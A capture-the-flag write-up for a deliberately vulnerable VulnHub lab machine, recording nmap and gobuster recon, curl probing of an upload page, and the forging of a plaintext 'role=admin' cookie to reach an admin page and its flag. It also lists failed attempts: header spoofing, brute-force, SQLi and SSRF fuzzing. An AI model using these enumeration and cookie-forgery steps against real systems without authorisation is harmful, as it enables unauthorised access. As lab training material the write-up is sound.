# VulnHub — Web Machine N7

Target: 192.168.122.51 (KVM/libvirt guest, Debian, Apache 2.4.46)
Attacker host: 192.168.122.1 (virbr0)

## 0. Recon

    sudo virsh net-dhcp-leases default        # -> 192.168.122.51
    nmap -sV -p- 192.168.122.51               # only 80/tcp http

    gobuster dir -u http://192.168.122.51 \
      -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
      -x php,html,txt,js,json,bak -t 60

Findings:
- index.html       200
- profile.php      200
- exploit.html     200  (pre-shipped CSRF PoC, action=http://localhost/profile.php)
- javascript/      301  -> /javascript/jquery/jquery.js (jQuery 3.5.1 wrapper, old Sizzle 1.10.18)
- server-status    403  (Apache Require local)

## 1. profile.php — the decoy

GET returns the page with an EMPTY form area (1473 bytes).
POST with any file returns the same page + `FLAG{N7` (1480 bytes).

    curl -s http://192.168.122.51/profile.php > get.txt
    curl -s -X POST http://192.168.122.51/profile.php -F "file=@x" > post.txt
    diff get.txt post.txt        # only change: FLAG{N7

Uploads are NOT saved:

    echo TESTMARKER > test.txt
    curl -X POST http://192.168.122.51/profile.php -F "file=@test.txt"
    curl -o /dev/null -w '%{http_code}' http://192.168.122.51/test.txt   # 404

Extension / content-type / filename bypasses: all identical (always just FLAG{N7).
Host / X-Forwarded-For / X-Real-IP spoofing: no change (still 1473).

=> profile.php is a teaser only. The `localhost` action in exploit.html is a hint,
   not the upload path.

## 2. /enter_network/ — the real entry point

    curl -s http://192.168.122.51/enter_network/
    # <form action="" method="POST"> user / pass / sub=SEND

Login accepts ANY credentials and always sets the same cookies:

    curl -i -X POST http://192.168.122.51/enter_network/ \
      -d "user=admin&pass=admin&sub=SEND"

Response: 324 bytes, identical for admin/admin and nosuchuser/nosuchpass.

Cookies issued:

    role = MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%253D
         = base64(md5("admin")) = "21232f297a57a5a743894a0e4a801fc3"  (DECOY)
    user = base64(argon2i hash of whatever username you typed)

Brute-forcing is pointless — no credential changes the response:

    gobuster fuzz -u http://192.168.122.51/enter_network/ -m POST \
      -B "user=FUZZ&pass=x&sub=SEND" \
      -w users.txt --exclude-length 324
    # (gobuster 3.8.2: -d is --delay; request body is -B)

## 3. admin.php — broken access control, the actual bug

Enumerate inside /enter_network/:

    gobuster dir -u http://192.168.122.51/enter_network/ \
      -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 40

    admin.php   200  126 bytes
    index.php   200  324 bytes

admin.php with no cookie / with the issued role cookie -> 126 bytes.
admin.php with the LITERAL role=admin               -> 105 bytes  <<< WIN

    curl -s -b "role=admin" http://192.168.122.51/enter_network/admin.php

Response:

    <!DOCTYPE html>
    <html>
        <head><title>admin interface</title></head>
    <body>
        KSA_01}</body>
    </html>

The app compares the cookie to the plain string `admin`, not to the
base64(md5("admin")) it issues. Trivial forge.

## 4. Flag

Fragment 1 (profile.php POST): FLAG{N7
Fragment 2 (admin.php role=admin): KSA_01}

Full: FLAG{N7KSA_01}
(if the checker rejects, try FLAG{N7_KSA_01})

## Dead ends (documented so future-me doesn't repeat)

- Upload to profile.php: never saves (canary test 404). profile.php's form is
  hidden from remote IPs; the flag fragment is returned on ANY POST.
- SSH to the guest: no 22 open (nmap -sV -p- = only 80).
- jQuery 3.5.1 with old Sizzle 1.10.18: DOM XSS gadget exists in theory but
  no page on the box calls $(location.hash), and there's no bot/browser to
  deliver it to. Dead.
- server-status: 403, Apache `Require local` — confirms the "localhost" theme
  but isn't reachable without SSRF/local request.
- Login brute-force / SQLi: pointless — the login validates nothing and sets
  identical cookies for every input.
- SSRF param fuzz on profile.php / index.html / enter_network: no callbacks
  to a listener on 192.168.122.1:8000.

## Key lesson

The "localhost" hints (exploit.html action, empty form, server-status 403)
were all pointing at the wrong endpoint. The real gate was a client-controlled
role cookie, and the admin page compared it to a plaintext string. Always
enumerate subdirectories (/enter_network/ was found late) and always test
cookie forgery against every page that behaves differently when authenticated.
